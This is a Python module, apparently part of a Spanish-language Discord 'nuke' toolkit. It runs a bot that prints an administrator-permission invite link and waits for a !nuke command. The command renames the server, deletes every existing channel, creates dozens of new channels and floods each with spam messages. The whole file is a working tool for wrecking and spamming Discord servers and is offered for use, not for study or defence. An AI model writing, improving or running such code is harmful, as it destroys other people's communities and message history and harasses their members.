import asyncio

import discord
from discord.ext import commands

from core import ui
from core.bot import make_bot, run_bot

NAME = "Nuke por comando !nuke"


def run(cfg):
    ui.cabecera("03", "NUKE POR COMANDO")
    ui.info("El bot entra al servidor y espera que escribas !nuke dentro.")
    ui.info("Configura primero qué hará el comando.")

    nombre_canal = ui.ask("Nombre para los canales nuevos")
    cantidad_canales = ui.ask_int("Canales a crear", default=30, minimum=1)
    cantidad_mensajes = ui.ask_int("Mensajes por canal", default=50, minimum=0)
    mensaje = ui.ask("Mensaje de spam (ENTER para ninguno)", required=False, default="")
    borrar = ui.confirm("¿Borrar los canales existentes antes de crear?", default=True)
    nombre_servidor = ui.ask(
        "Nuevo nombre del servidor (ENTER para no cambiar)", required=False, default=""
    )

    bot = make_bot(prefix="!")

    async def enviar_spam(canal):
        for _ in range(cantidad_mensajes):
            try:
                await canal.send(mensaje)
            except discord.HTTPException:
                break
            await asyncio.sleep(0.15)

    async def ejecutar_nuke(guild):
        ui.sep()
        ui.step(f"NUKE EN: {guild.name} ({guild.id})")
        ui.sep()

        if nombre_servidor:
            try:
                await guild.edit(name=nombre_servidor)
                ui.ok(f"Nombre del servidor -> {nombre_servidor}")
            except discord.HTTPException:
                ui.warn("No se pudo cambiar el nombre del servidor.")

        if borrar:
            ui.info("Borrando canales...")
            for canal in list(guild.channels):
                try:
                    await canal.delete()
                except discord.HTTPException:
                    pass
            ui.ok("Canales borrados.")

        ui.info("Creando canales...")
        creados = []
        for _ in range(cantidad_canales):
            try:
                creados.append(await guild.create_text_channel(nombre_canal))
            except discord.HTTPException:
                pass
        ui.ok(f"Canales creados: {len(creados)}")

        if cantidad_mensajes and mensaje:
            ui.info("Enviando spam...")
            await asyncio.gather(*[enviar_spam(c) for c in creados], return_exceptions=True)

        ui.ok("NUKE COMPLETADO")

    @bot.event
    async def on_ready():
        ui.cabecera("03", "NUKE POR COMANDO")
        ui.ok(f"Conectado como {bot.user}")
        enlace = (
            f"https://discord.com/oauth2/authorize?client_id={bot.user.id}"
            f"&permissions=8&scope=bot"
        )
        ui.title("ENLACE DE INVITACIÓN")
        print(f"{ui.CYAN}{ui.BOLD}{enlace}{ui.RESET}")
        ui.warn("Escribe !nuke en el servidor para ejecutar.")
        ui.info("Presiona CTRL+C para volver al menú.")

    @bot.command(name="nuke", aliases=["nukeall"])
    async def nuke(ctx):
        if ctx.guild is None:
            await ctx.send("Usa este comando dentro de un servidor.")
            return
        await ctx.send("Ejecutando nuke...")
        await ejecutar_nuke(ctx.guild)

    run_bot(bot, cfg.token)
    ui.pause()
